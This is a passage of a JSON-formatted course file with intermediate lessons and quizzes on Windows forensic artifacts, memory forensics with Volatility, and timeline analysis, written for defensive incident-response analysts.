      "content": "A **forensic artifact** is a trace that Windows creates automatically as it runs — not a security log someone chose to enable, but a byproduct of the operating system doing its job. Windows constantly records small facts to make itself faster and more convenient: which programs you have run (so it can pre-load them), which files you opened recently (so it can show them in a jump list), which folders you browsed (so it remembers your view settings). Each of these conveniences leaves a durable record, and those records are gold for an investigator.\n\nWhy do these matter so much when we already have event logs and EDR? Three reasons:\n\n- **They survive when other evidence does not.** An attacker may clear the Security event log or operate on a machine with no EDR agent. But forensic artifacts are numerous, scattered, and often unknown to the attacker, so they frequently remain even after deliberate log-clearing.\n- **They prove things logs may not capture.** Without specific auditing enabled, Windows may not log that a particular program executed — but the **Prefetch** artifact records it anyway. Artifacts fill the gaps in your logging coverage.\n- **They defeat anti-forensics.** Attackers try to hide, but they rarely know *every* place Windows recorded them. An artifact they forgot to wipe can expose the whole operation.\n\nArtifacts answer specific investigative questions, and it helps to think of them by the question they answer:\n\n- *Did this program run?* → execution artifacts (Prefetch, Amcache, Shimcache).\n- *Did this file exist, and when?* → the file system's Master File Table (MFT).\n- *What files did the user open?* → LNK files and Jump Lists.\n- *Which folders did they browse?* → ShellBags.\n\nThe reason artifacts are so powerful in combination is that no single one tells the whole story, but together they corroborate each other: Prefetch says a tool ran, the MFT shows when its file appeared, a LNK file shows the user opened a document, ShellBags show they browsed to a sensitive folder. This lesson walks through the key artifacts by category so you know what each proves — and, just as importantly, what it does *not* prove."
    },
    {
      "heading": "Execution Artifacts — Proving a Program Ran",
      "content": "The most-asked forensic question is \"did this program execute on the machine?\" Windows keeps several records that help answer it, each with different strengths and an important catch about what it really proves.\n\n**Prefetch.** To make applications launch faster, Windows creates a small file in `C:\\Windows\\Prefetch\\` for programs that run — named like `PROGRAM.EXE-XXXXXXXX.pf`. This artifact is strong **evidence of execution**: it typically records the program's name, **how many times it has run**, and the **last run time(s)** (recent Windows versions keep the last several run times). If you see `MIMIKATZ.EXE-...pf`, that tool ran on this machine. (Note: Prefetch is enabled by default on Windows workstations but often disabled on servers.)\n\n**Amcache.** The `Amcache.hve` registry hive records information about programs that have been present and run, including **file paths and SHA-1 hashes** and timestamps. The hash is especially useful — it lets you tie an executed file to threat intelligence even if the file itself is gone.\n\n**Shimcache (AppCompatCache).** Stored in the SYSTEM registry hive, Shimcache tracks executables the system encountered, recording the **file path, size, and last-modified time**. A crucial subtlety: Shimcache indicates a program was *present/registered* by the compatibility system, which does **not** by itself guarantee it was executed. Treat it as evidence of presence and a timeline data point, corroborated by other artifacts.\n\nThe key discipline with execution artifacts is knowing **exactly what each proves**:\n\n| Artifact | Proves | Bonus data |\n|----------|--------|-----------|\n| Prefetch | Execution (strong) | Run count, last run times |\n| Amcache | Presence/execution | SHA-1 hash, path, time |\n| Shimcache | Presence (not guaranteed execution) | Path, size, modified time |\n\nBecause each has caveats, analysts **correlate** them. Prefetch plus an Amcache entry with a known-malicious hash is a far stronger case than either alone. And when an attacker deletes their tool, these artifacts can still prove it was there and ran — which is exactly why execution artifacts are the first place a responder looks to establish what the intruder actually did."
    },
    {
      "heading": "File and Activity Artifacts — Files, Folders, and Access",
      "content": "Beyond execution, investigators need to know what *files* existed and what a *user* did. A second family of artifacts answers these.\n\n**The Master File Table (MFT).** On an NTFS file system, the **`$MFT`** is a master index containing a record for **every file and folder** on the volume — its name, size, location, and timestamps. This makes the MFT foundational for two reasons. First, it can reveal files that were **deleted**, because their records often persist until overwritten. Second, it is the backbone of timeline analysis (next lesson), because each entry carries timestamps.\n\nThose timestamps deserve a note. NTFS tracks a set often abbreviated **MACB** — **M**odified, **A**ccessed, **C**hanged (MFT record change), and **B**orn (created). Two different structures store them (`$STANDARD_INFORMATION` and `$FILE_NAME`), and comparing the two can expose **timestomping** — an anti-forensic trick where an attacker backdates a file's timestamps to blend in. When the two timestamp sets disagree in tell-tale ways, tampering is likely.\n\n**LNK files (shortcuts).** Windows creates `.lnk` shortcut files when a user opens documents, and these are rich: a LNK records the **target file's path**, its **timestamps**, and volume information — even if the original file or the removable drive it lived on is long gone. A LNK pointing at `E:\\stolen_data.xlsx` is evidence the user opened that file from a drive `E:`.\n\n**Jump Lists.** The recently-accessed items you see when right-clicking an app on the taskbar are stored as **Jump List** artifacts, recording which files a user opened with which application — another view of user file access.\n\n**ShellBags.** Stored in the registry, **ShellBags** record folders the user **browsed in Explorer**, including their view settings. Their forensic value is proving that a user navigated to a specific folder — even a folder on a network share or removable device that no longer exists. If an insider claims they never opened a sensitive folder, ShellBags may say otherwise.\n\nRead together, this family reconstructs user activity: the MFT shows a file existed and when, a LNK and Jump List show it was opened, and ShellBags show the folders the user explored to get there. Combined with the execution artifacts, you can narrate not just *what ran* but *what a person touched* — the difference between knowing malware executed and understanding the human actions around it."
    },
    {
      "heading": "Using Artifacts in an Investigation",
      "content": "Individual artifacts are clues; an investigation is what happens when you assemble them into a coherent, corroborated account. A few principles make that assembly reliable.\n\n**Corroborate, never rely on one artifact.** Every artifact has caveats — Shimcache may not prove execution, timestamps can be stomped, Prefetch may be off on servers. The professional habit is to build each conclusion from **multiple independent artifacts** that agree. \"The tool ran\" becomes solid when Prefetch shows execution, Amcache shows the hash, and the MFT shows when the file appeared. One artifact is a lead; three that agree is a finding.\n\n**Let artifacts fill your visibility gaps.** In a mature environment you have EDR and rich logs, and artifacts are backup and confirmation. But on an unmanaged machine, or after an attacker cleared logs, artifacts may be your *primary* evidence. Knowing they exist changes what you can prove: even with the Security log wiped, Prefetch, Amcache, the MFT, and ShellBags may still reconstruct the intrusion.\n\n**Watch for anti-forensics.** Sophisticated attackers try to erase or manipulate artifacts — deleting Prefetch files, clearing logs, timestomping. But covering *every* trace is hard, and the *attempt* itself is evidence. Missing Prefetch on a machine that should have it, or timestamp anomalies between `$STANDARD_INFORMATION` and `$FILE_NAME`, are signs someone tried to hide. MITRE ATT&CK tracks this as **Indicator Removal** (including timestomping), and a good analyst treats the absence of expected artifacts as suspicious rather than reassuring.\n\n**How the tools fit.** Analysts rarely read raw hives and `$MFT` by hand; they use forensic tooling (from suites like Autopsy to Eric Zimmerman's focused tools) to parse each artifact into readable output. The concepts in this lesson are what let you *interpret* that output — knowing that a Prefetch entry means execution, that a ShellBag means folder access, that a `$FILE_NAME`/`$STANDARD_INFORMATION` mismatch means possible timestomping.\n\nThe overarching mindset is that **Windows is always writing down what it does**, usually for convenience rather than security, and an investigator's craft is knowing where those notes are kept and what each one honestly proves. Master the artifact map and you can reconstruct an intrusion from the traces an attacker never knew they left — which is exactly the Tier-2 skill that turns \"something happened\" into a documented, defensible account of what happened."
    }
  ],
  "keyTakeaways": [
    "Forensic artifacts are traces Windows creates automatically for its own convenience (not security logs); they survive log-clearing, fill logging gaps, and defeat anti-forensics because attackers rarely know every place they were recorded.",
    "Execution artifacts answer 'did this run?': Prefetch (strong evidence of execution + run count/last-run times), Amcache (path + SHA-1 hash), and Shimcache/AppCompatCache (presence, but NOT guaranteed execution) — correlate them rather than trusting one.",
    "File/activity artifacts: the MFT ($MFT) records every file with MACB timestamps (and can reveal deleted files + expose timestomping via $STANDARD_INFORMATION vs $FILE_NAME); LNK files and Jump Lists show files a user opened; ShellBags show folders browsed in Explorer.",
    "Investigate by corroborating multiple independent artifacts, using them as primary evidence when logs/EDR are absent, and treating missing-but-expected artifacts or timestamp anomalies as anti-forensics (MITRE Indicator Removal) — a lead is one artifact, a finding is several that agree."
  ],
  "quiz": [
    {
      "question": "During an investigation the attacker cleared the Windows Security event log, so you cannot confirm from logs that their tool ran. You find MIMIKATZ.EXE-A1B2C3D4.pf in C:\\Windows\\Prefetch with a run count of 3 and recent run times. What can you conclude, and why?",
      "options": [
        {
          "label": "Nothing, because once the Security event log is cleared there is no remaining way on Windows to prove that any particular program was ever executed.",
          "value": "a"
        },
        {
          "label": "The Prefetch artifact is strong evidence the tool executed (with a run count and last-run times), surviving the log-clearing the attacker performed.",
          "value": "b"
        },
        {
          "label": "Only that the file existed on disk, because Prefetch records the presence of files but can never indicate whether a program was actually run.",
          "value": "c"
        },
        {
          "label": "That the tool was blocked, because a Prefetch file is created by antivirus specifically to record executables it prevented from running on the host.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Prefetch is a byproduct Windows creates to speed up launching programs, so a .pf file with a run count and last-run times is strong evidence the tool executed — and because it is a separate artifact from the Security log, it survives the attacker clearing that log. Option a is wrong because artifacts like Prefetch remain after log-clearing. Option c confuses Prefetch (execution) with presence-only artifacts like Shimcache. Option d invents an antivirus origin; Prefetch is created by Windows for performance, not by AV to log blocks."
    },
    {
      "question": "Why do experienced forensic analysts treat Shimcache (AppCompatCache) differently from Prefetch when trying to prove a program executed?",
      "options": [
        {
          "label": "Shimcache indicates a program was present/registered by the compatibility system, which does not by itself guarantee execution, so it needs corroboration.",
          "value": "a"
        },
        {
          "label": "Shimcache is stored only in memory and disappears at shutdown, so unlike Prefetch it can never be recovered during a post-incident investigation.",
          "value": "b"
        },
        {
          "label": "Shimcache records the full contents of every executed file, making it so large that analysts avoid it in favour of the smaller Prefetch artifact.",
          "value": "c"
        },
        {
          "label": "Shimcache is created only by third-party antivirus tools, so its presence depends entirely on which security product happened to be installed.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "Shimcache (AppCompatCache) records executables the compatibility system encountered — path, size, last-modified time — which shows presence/registration but does not by itself prove the program actually ran, so analysts corroborate it with execution artifacts like Prefetch or Amcache. Option b is wrong because Shimcache lives in the SYSTEM registry hive and is recoverable. Option c is false; it stores metadata, not file contents. Option d is wrong because Shimcache is a native Windows artifact, not an AV product."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/windows/win32/fileio/master-file-table",
    "https://attack.mitre.org/techniques/T1070/006/",
    "https://www.sans.org/posters/windows-forensic-analysis/"
  ],
  "xp": 210,
  "estimatedMinutes": 42,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-memory-forensics-volatility",
  "slug": "memory-forensics-with-volatility",
  "title": "Memory Forensics with Volatility",
  "topic": "Digital Forensics",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "Some of the most important evidence in a modern intrusion never touches the disk. Malware that runs only in memory, code injected into a trusted process, the live network connections to a command-and-control server, even decrypted data and credentials — all of it lives in RAM and vanishes the moment the machine powers off. Memory forensics is the discipline of capturing and analysing that volatile evidence, and Volatility is the tool that made it accessible. This lesson explains why memory matters, how a memory image is captured, and how Volatility's plugins reveal the things disk analysis alone would miss.",
  "sections": [
    {
      "heading": "Why Memory Is the Richest Evidence",
      "content": "A computer's **RAM (memory)** holds the live, working state of everything currently happening on the machine: every running process, the code it is executing, its open network connections, and the data it is actively using. Unlike the disk, which stores things persistently, memory is **volatile** — its contents exist only while the machine is powered on and are lost the instant it shuts down or reboots. That fragility is exactly why memory is so valuable: it captures a moment of *live* activity that no static disk image can.\n\nConsider what an investigator can find in memory that may exist **nowhere on disk**:\n\n- **Running processes**, including malicious ones — and, crucially, processes an attacker tried to *hide* from the normal process list.\n- **Injected code** — malware that ran inside a legitimate process (recall DLL/process injection) leaves its code in that process's memory, not as a file.\n- **Fileless malware** — attacks that live entirely in memory, using PowerShell or scripts, that traditional file scanning cannot see because there is no file.\n- **Live network connections** — the active connections to a C2 server at the moment of capture.\n- **Decrypted data and credentials** — passwords, keys, and data that are encrypted on disk but must be decrypted in memory to be used.\n- **Command history and injected commands** — what was actually run.\n\nThis is why the **order of volatility** — a core forensic principle — says to collect the most fleeting evidence *first*: memory before disk, because a reboot destroys memory while the disk survives. If you power a suspicious machine off before capturing RAM, you may permanently lose the only evidence of a fileless or injected attack.\n\nMemory forensics therefore closes a gap that disk forensics and even some logging cannot: it catches the attacks that deliberately avoid the disk. As intruders increasingly go **fileless** and **inject** into trusted processes specifically to evade file-based defences, the ability to capture and read memory has moved from a niche skill to an essential Tier-2 capability. The rest of this lesson covers how you get a memory image and how Volatility turns that raw dump into answers."
    },
    {
      "heading": "Capturing a Memory Image",
      "content": "Before you can analyse memory, you have to **capture** it — create a copy of the machine's RAM as a file, called a **memory image** or **memory dump**. How you do this matters, because the act of capturing must disturb the evidence as little as possible.\n\n**Acquisition tools.** On a live Windows machine, dedicated tools read physical memory and write it to a file. Common ones include **WinPmem**, **DumpIt**, **FTK Imager**, and **Magnet RAM Capture**. They produce a raw image (often several gigabytes, matching the machine's RAM size) that you then analyse offline.\n\n**Virtual machines make it easy.** If the target is a VM, its memory can often be captured simply by taking a **snapshot** or saving its state — the hypervisor writes the VM's RAM to a file you can analyse directly. This is one reason virtualised environments are convenient for both incident response and training.\n\n**The golden rule: capture memory first, and capture it live.** Two principles follow from the order of volatility:\n\n- **Do not power off first.** Shutting down or rebooting destroys memory. If you suspect a fileless or injected attack, capture RAM *before* anything else touches the machine.\n- **Minimise your footprint.** The capture tool itself runs in memory and changes a little of it. Analysts accept this small, unavoidable disturbance and document it, choosing trusted tools that alter as little as possible.\n\n**Preserve it properly.** As with all evidence, a memory image should be handled under **chain of custody** — hashed on capture, stored securely, and analysed on a *copy* — so the findings stand up to scrutiny (this connects to the evidence-collection lesson).\n\nOnce you have a sound image, the machine's live state is frozen in a file you can examine repeatedly without further risk. The image is just raw bytes, though — a multi-gigabyte block of memory with no obvious structure. Turning it into meaningful answers (which processes were running, what was injected, what connected out) requires a tool that understands the operating system's memory layout. That tool, for most of the industry, is Volatility."
    },
    {
      "heading": "Volatility and Its Core Plugins",
      "content": "**Volatility** is the leading open-source **memory-forensics framework**. It takes a raw memory image and, using knowledge of how operating systems organise memory, reconstructs the machine's state at the moment of capture. You drive it with **plugins**, each of which answers a specific question about the image. (The modern version is **Volatility 3**; you may also encounter Volatility 2 and its slightly different command style.)\n\nA handful of plugins cover most investigations, and they map neatly to the evidence types from the first section:\n\n- **`pslist` / `pstree`** — list the running processes, `pstree` showing them as a **parent-child tree** (the process-lineage concept applied to memory). Your starting point for \"what was running?\"\n- **`psscan`** — scans memory for process structures directly, which can reveal **hidden or terminated processes** that `pslist` misses — a key way to find malware that unlinked itself from the normal list.\n- **`netscan` / `netstat`** — recover **network connections and listening ports**, exposing live C2 connections and their remote addresses.\n- **`malfind`** — hunts for signs of **injected code** — memory regions that are executable but not backed by a file on disk, the fingerprint of process injection and many fileless techniques. One of the most valuable plugins for catching stealthy malware.\n- **`dlllist` / `ldrmodules`** — the DLLs loaded in a process, useful for spotting injected or unlinked modules.\n- **`cmdline`** — the command-line arguments each process was launched with, revealing what was actually run.\n- **`handles`, `hivelist`, `filescan`** — open handles, registry hives present in memory, and file objects — for deeper pivoting.\n\nThe analytical pattern is to **start broad and drill in**. Run `pstree` to see the process landscape and spot anything odd — a process with a suspicious name, an unusual parent, or one that should not exist. Cross-check with `psscan` to catch hidden processes. Point `malfind` at a suspect process to confirm injected code. Use `netscan` to see if it was talking to an external server, and `cmdline` to see how it was launched. In a few plugin runs you move from a raw image to a concrete finding: *this process, injected with code, was connecting to this IP, launched by this command.*\n\nThat is the power of memory forensics — Volatility turns an opaque block of RAM into the same kind of readable story you would get from EDR, but for a machine that had no EDR, or for the fileless activity EDR itself might have missed."
    },
    {
      "heading": "Reading a Memory Image in an Investigation",
      "content": "Knowing the plugins is the mechanics; using them to answer real questions is the skill. Memory forensics shines in a specific set of investigative situations, and recognising them tells you when to reach for it.\n\n**When memory forensics is the right tool:**\n\n- **Suspected fileless or in-memory malware** — when EDR or AV found little on disk but the machine behaves as if compromised, memory may hold the only evidence.\n- **Suspected process injection** — `malfind` is purpose-built to find code injected into trusted processes, which is invisible to file scanning.\n- **Hidden processes or rootkit-like behaviour** — `psscan` can surface processes deliberately removed from the normal list.\n- **Confirming live C2** — `netscan` captures the actual connections at the moment of capture, tying an infection to its operator.\n- **Recovering volatile secrets** — decrypted data, keys, or command history that exist only in RAM.\n\n**A worked flow.** Suppose an alert suggests a compromise but disk scans are clean. You capture memory, then: `pstree` shows a `svchost.exe` with an unusual parent (a red flag from the process lesson); `psscan` confirms a second, hidden process; `malfind` reports an executable, non-file-backed memory region inside a normal process — injected code; `netscan` shows that process connected to an external IP; `cmdline` reveals a suspicious launch command. Each plugin corroborates the last, and together they prove a fileless, injected intrusion that never left a clear trace on disk.\n\n**Combine memory with everything else.** Memory forensics is most powerful as one layer of a broader investigation. The injected-code finding from `malfind` pairs with the **Windows artifacts** (did the loader run? Prefetch/Amcache), the **timeline** (when did this happen?), and network data (was the C2 IP seen in firewall logs?). Memory answers \"what was live at this instant\"; the other sources answer \"how did it get here and what did it do over time.\"\n\n**Keep the limits in mind.** A memory image is a **single snapshot in time** — it shows the moment of capture, not history, so activity that ended before capture may be gone. And memory analysis is technical and version-sensitive. But within its niche — catching the stealthy, disk-avoiding attacks that define modern intrusions — nothing else substitutes for it. For a Tier-2 analyst, the essential takeaway is to **capture RAM early (before powering off), because that fleeting evidence is often the only proof of the very attacks designed to leave none.**"
    }
  ],
  "keyTakeaways": [
    "RAM is volatile but holds the richest live evidence — running (and hidden) processes, injected code, fileless malware, active C2 connections, and decrypted credentials — much of which exists nowhere on disk, so the order of volatility says capture memory before disk and never power off a suspect machine first.",
    "A memory image/dump is captured live with tools like WinPmem, DumpIt, FTK Imager, or (for VMs) a snapshot; capture with minimal footprint, hash it, and analyse a copy under chain of custody.",
    "Volatility is the open-source memory-forensics framework driven by plugins: pslist/pstree (processes), psscan (hidden/terminated), netscan (connections), malfind (injected code), dlllist, and cmdline — start broad (pstree) then drill into a suspect process.",
    "Reach for memory forensics for fileless malware, process injection, hidden processes, and confirming live C2; corroborate its findings with Windows artifacts, timeline, and network data, remembering an image is a single snapshot in time, not history."
  ],
  "quiz": [
    {
      "question": "An EDR alert suggests a workstation is compromised, but a full disk scan finds nothing malicious. You suspect fileless malware or code injected into a legitimate process. Why is capturing and analysing memory the right next step, and what must you avoid?",
      "options": [
        {
          "label": "Memory analysis is pointless here; you should immediately reboot the machine to clear the infection, since fileless malware cannot survive a restart anyway.",
          "value": "a"
        },
        {
          "label": "Fileless/injected code lives in RAM and often not on disk, so capture memory before powering off — a reboot would destroy the only evidence of the attack.",
          "value": "b"
        },
        {
          "label": "You should power the machine off first to preserve the disk, then capture memory afterward from the powered-down drive using a standard imaging tool.",
          "value": "c"
        },
        {
          "label": "Memory holds no evidence of injected code, so the clean disk scan already proves the alert was a false positive and no further action is needed.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Fileless and injected malware runs in RAM and frequently leaves nothing on disk, so a clean disk scan does not clear the machine; you capture memory while it is still powered on because the order of volatility means a reboot destroys that fleeting evidence. Option a is dangerous — rebooting destroys the very evidence and does not guarantee removal. Option c is impossible, since a powered-off drive holds no RAM. Option d wrongly treats a clean disk scan as proof of no compromise."
    },
    {
      "question": "You have a memory image and want to find code that was injected into a legitimate process (a common fileless technique). Which Volatility plugin is purpose-built for this, and what does it look for?",
      "options": [
        {
          "label": "The cmdline plugin, which lists command-line arguments and therefore directly displays the full source code of any injected payload in the process.",
          "value": "a"
        },
        {
          "label": "The malfind plugin, which flags memory regions that are executable but not backed by a file on disk — the fingerprint of injected code.",
          "value": "b"
        },
        {
          "label": "The pslist plugin, which lists visible processes and is guaranteed to include every hidden or injected process running on the system at capture time.",
          "value": "c"
        },
        {
          "label": "The hivelist plugin, which enumerates registry hives in memory and is the standard way to detect code injected into a running process's address space.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "malfind is designed to hunt for injected code: it flags memory regions that are executable yet not backed by a file on disk, which is the signature of process injection and many fileless techniques. Option a is wrong because cmdline shows launch arguments, not injected code. Option c is wrong because pslist shows visible processes and can miss hidden ones (psscan is used for those), and it does not identify injection. Option d is wrong because hivelist enumerates registry hives, unrelated to detecting injection."
    }
  ],
  "references": [
    "https://volatility3.readthedocs.io/en/latest/",
    "https://attack.mitre.org/techniques/T1055/",
    "https://www.sans.org/posters/hunt-evil/"
  ],
  "xp": 220,
  "estimatedMinutes": 42,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-timeline-analysis-super-timelines",
  "slug": "timeline-analysis-and-super-timelines",
  "title": "Timeline Analysis and Super-Timelines",
  "topic": "Digital Forensics",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "An intrusion is a sequence of events in time: the phishing email arrived, the document was opened, a tool ran, credentials were stolen, another machine was reached. Scattered across logs and artifacts, those events are just isolated facts — but ordered on a single timeline, they become a story you can read. Timeline analysis is the discipline of arranging evidence chronologically to reconstruct exactly what happened, in what order, and it is one of the most powerful techniques a Tier-2 investigator has. This lesson explains how timelines work, the timestamps behind them, how super-timelines combine every source, and how attackers try to break them.",
  "sections": [
    {
      "heading": "Why the Order of Events Is the Investigation",
      "content": "At its core, investigating an incident means answering questions of **sequence**: What happened first? What did it lead to? What was the very first malicious action (**patient zero**), and how far did the attacker get (the **blast radius**)? These are fundamentally questions about *time*, and the technique for answering them is **timeline analysis** — placing evidence in chronological order so the sequence of an attack becomes visible.\n\nThink of it like a detective assembling a case. Individual clues — a fingerprint here, a receipt there, a witness statement — mean little in isolation. Arranged on a timeline, they reveal a narrative: the suspect was *here* at 9, bought *this* at 9:30, was seen *there* at 10. Digital evidence works the same way. A single log entry says a program ran; a single artifact says a file appeared. But ordered together, they show that a phishing email arrived at 14:02, the attachment was opened at 14:05, PowerShell ran at 14:05, a tool was downloaded at 14:06, and a connection to an external server opened at 14:07 — a coherent attack chain.\n\nTimeline analysis delivers three things no single piece of evidence can:\n\n- **Causality and sequence.** Seeing that event B always follows event A reveals how the attack unfolded and what caused what.\n- **Scope.** Following the timeline forward shows every machine and account the attacker touched — the blast radius you must contain.\n- **Root cause.** Following it backward leads to the initial access — the patient-zero action you must fix so it cannot happen again.\n\nThis is why timeline analysis sits at the heart of incident response. The messy reality of an investigation is dozens of data sources — event logs, forensic artifacts, EDR telemetry, firewall logs — each holding a fragment. The investigator's job is to weave those fragments into one ordered narrative. Do it well and the incident explains itself: you can point to the first click, trace each step, and show where it ended. The rest of this lesson covers the raw material of timelines (timestamps), the technique for combining every source (super-timelines), and the ways attackers try to corrupt the record."
    },
    {
      "heading": "Timestamps — The Raw Material of Timelines",
      "content": "Every timeline is built from **timestamps**, and using them correctly requires understanding a few things that trip up beginners.\n\n**The MACB times.** On Windows/NTFS, each file carries a set of timestamps often abbreviated **MACB**:\n\n- **M — Modified**: when the file's *content* last changed.\n- **A — Accessed**: when it was last read/accessed (note: access-time updates are sometimes disabled for performance, so this is not always reliable).\n- **C — Changed**: when the file's **MFT record** (metadata) last changed — distinct from content modification.\n- **B — Born (Created)**: when the file was created on the volume.\n\nReading these together tells a rich story: a file *created* at one time but *modified* earlier than its creation is suspicious; a tool whose *created* time matches the moment of intrusion places it in the attack.\n\n**Two places store the times.** NTFS keeps timestamps in two structures — **`$STANDARD_INFORMATION`** (the ones most tools and users see and that programs can change) and **`$FILE_NAME`** (harder for normal software to alter). This duplication is a gift to investigators, as the anti-forensics section will show.\n\n**Time zones and UTC — the classic pitfall.** Timestamps mean nothing without knowing their **time zone**. Different sources record time differently: some in local time, some in **UTC** (Coordinated Universal Time). If you build a timeline mixing local-time and UTC events without normalising them, the order will be wrong and your reconstruction will be false. The professional discipline is to **convert everything to a single reference (usually UTC)** before ordering it, so events from a firewall, a Windows log, and a cloud service line up correctly. A one-hour time-zone error can make the effect appear to precede the cause.\n\n**Clock accuracy matters too.** Machines whose clocks drift, or that are not synchronised (via NTP), produce timestamps that are subtly wrong, which is why enterprises synchronise clocks and why you note any known skew when correlating across systems.\n\nGet timestamps right — the MACB meaning, the two NTFS structures, and above all consistent time zones — and your timeline is trustworthy. Get them wrong, and a beautifully detailed timeline can tell a confidently incorrect story. This rigor is exactly what separates a reliable reconstruction from a misleading one."
    },
    {
      "heading": "Super-Timelines — Combining Every Source",
      "content": "A basic timeline might use one source, such as file-system timestamps. But a real intrusion leaves evidence across *many* sources, and the most powerful technique combines them all into a single, unified chronology called a **super-timeline**.\n\nA **super-timeline** merges timestamped events from every available artifact and log — file-system MACB times, event logs, Prefetch and Amcache execution times, registry key modification times, browser history, and more — into one massive, ordered list. The value is that it puts *all* the evidence side by side in time, so you can see, in one view, that a registry Run key was created (persistence) two seconds after a program executed (from Prefetch) one minute after a suspicious logon (from the event log). No single source shows that chain; the super-timeline does.\n\n**The tooling: Plaso / log2timeline.** The standard open-source engine for building super-timelines is **Plaso**, whose main tool is **`log2timeline`**. It automatically parses a disk image (or set of artifacts), extracts timestamps from dozens of artifact types, and outputs a combined timeline — typically a large CSV-like file. Analysts then load that output into a viewer such as **Timeline Explorer** to sort, filter, and search it. The workflow is: `log2timeline` **extracts and normalises** every timestamped event, then the analyst **filters and reads** the result around the times of interest.\n\n**The challenge: volume.** A super-timeline can contain *millions* of entries, because it captures every timestamped event on a system, most of them benign. This is both its strength (nothing is missed) and its difficulty (the signal is buried). The essential technique is to **anchor and window**: start from a known event — a pivot point such as the time an alert fired or a malicious file was created — and examine the timeline in a tight window around it (say, the minutes before and after). In that window, the attacker's actions cluster together, and the surrounding benign noise thins out. From one confirmed bad event, you expand outward, following the chain in both directions.\n\nThe payoff is a complete, evidence-backed reconstruction: with a super-timeline anchored on a pivot, you can often narrate an entire intrusion minute by minute, citing the exact artifact behind each step. This is the Tier-2 skill that turns a pile of disparate evidence into a single, defensible story — and it is precisely why super-timelines are a staple of serious incident response, even though building and reading them takes discipline."
    },
    {
      "heading": "Anti-Forensics and Reading Timelines Critically",
      "content": "Attackers know that timelines expose them, so sophisticated intruders try to **corrupt the temporal record**. A skilled analyst therefore reads a timeline critically, alert to signs of tampering — and, importantly, treats the tampering itself as evidence.\n\n**Timestomping.** The most common time-based anti-forensic technique is **timestomping** — deliberately altering a file's timestamps to hide it, usually by backdating the malicious file to look old and legitimate (matching, say, the timestamps of normal system files). If an attacker's tool appears to have been created years ago, a naive timeline places it far from the intrusion and it escapes notice. MITRE ATT&CK tracks this as **Indicator Removal: Timestomp**.\n\n**How timestomping is caught.** This is where the two NTFS timestamp structures from earlier become decisive. Most timestomping tools alter the easily-changed **`$STANDARD_INFORMATION`** times but not the harder-to-modify **`$FILE_NAME`** times. When those two sets **disagree** — for example, `$STANDARD_INFORMATION` says the file is from 2019 but `$FILE_NAME` shows it appeared last Tuesday — that mismatch is a strong signal of tampering. The very attempt to hide becomes a flag pointing right at the malicious file.\n\n**Other manipulations.** Attackers also **clear logs** (removing event-log entries that would appear on the timeline), **delete artifacts**, and try to blend their activity into busy periods. As with all anti-forensics, covering *every* source is extremely hard, so gaps and inconsistencies appear: a suspicious absence of logs during a window when other artifacts show activity, or execution artifacts with no corresponding log entries.\n\n**Reading critically means:**\n\n- **Corroborate across sources.** A single timestamp can lie; multiple independent artifacts agreeing on a time are trustworthy. If Prefetch, the MFT `$FILE_NAME` time, and an event log all point to the same moment, that moment is solid even if one `$STANDARD_INFORMATION` time was stomped.\n- **Treat anomalies as leads.** A timestamp mismatch, a gap in logs, or an artifact that contradicts the expected order is not an inconvenience — it is often the thread that reveals the attacker's attempt to hide.\n- **Anchor on the hard-to-fake.** Prefer timestamps and artifacts that are difficult to alter, and be cautious with easily-modified ones.\n\nThe overarching lesson is that a timeline is powerful but not infallible: it reflects the records the system kept, and those records can be manipulated. A strong Tier-2 analyst builds the timeline rigorously — normalised time zones, multiple sources, a clear pivot — and then reads it with healthy suspicion, knowing that the places where the timeline *does not make sense* are frequently where the attacker tried hardest to disappear."
    }
  ],
  "keyTakeaways": [
    "Timeline analysis arranges evidence chronologically to answer questions of sequence — patient zero (root cause, by tracing backward) and blast radius (scope, by tracing forward) — turning isolated log entries and artifacts into a readable attack narrative.",
    "Timelines are built from timestamps: the MACB set (Modified/Accessed/Changed/Born), stored in two NTFS structures ($STANDARD_INFORMATION, easily changed, and $FILE_NAME, harder to alter); always normalise every source to one time zone (usually UTC) or the order will be wrong.",
    "A super-timeline merges every timestamped source (file system, event logs, Prefetch/Amcache, registry, browser) into one chronology — built with Plaso/log2timeline and read in a viewer like Timeline Explorer; because it holds millions of entries, anchor on a pivot event and examine a tight window around it.",
    "Attackers timestomp (backdating files, MITRE Indicator Removal) and clear logs, but timestomping is caught when $STANDARD_INFORMATION and $FILE_NAME disagree; read timelines critically — corroborate across sources, treat gaps/mismatches as leads, and anchor on hard-to-fake artifacts."
  ],
  "quiz": [
    {
      "question": "You are building a timeline from a Windows event log (recorded in local time, UTC+2) and a cloud service log (recorded in UTC). Why must you normalise these before ordering events, and what goes wrong if you do not?",
      "options": [
        {
          "label": "Normalisation is unnecessary, because all digital timestamps are automatically stored in the same universal format regardless of the source that produced them.",
          "value": "a"
        },
        {
          "label": "Without converting both to one reference like UTC, events will be mis-ordered, so an effect can appear to precede its cause and the reconstruction becomes false.",
          "value": "b"
        },
        {
          "label": "You only need to normalise if the two logs are more than 24 hours apart; within the same day, mixing local time and UTC has no effect on event ordering.",
          "value": "c"
        },
        {
          "label": "Normalisation matters only for the display colours in the timeline tool and never changes the actual chronological order the events are placed in.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Timestamps are meaningless without their time zone, so mixing local-time (UTC+2) and UTC events without normalising will mis-order them — a two-hour offset can make an effect appear before its cause and produce a confidently wrong reconstruction; the fix is converting everything to one reference, usually UTC. Option a is false because sources record time differently (local vs UTC). Option c is wrong because even a small offset mis-orders events within a day. Option d trivialises normalisation, which directly affects ordering, not just display."
    },
    {
      "question": "A suspected malicious executable shows a creation timestamp of 2019 in $STANDARD_INFORMATION, but its $FILE_NAME timestamp shows it appeared last week. What does this discrepancy most likely indicate?",
      "options": [
        {
          "label": "A normal Windows update, because the operating system routinely rewrites $STANDARD_INFORMATION to a date years in the past whenever it patches a file.",
          "value": "a"
        },
        {
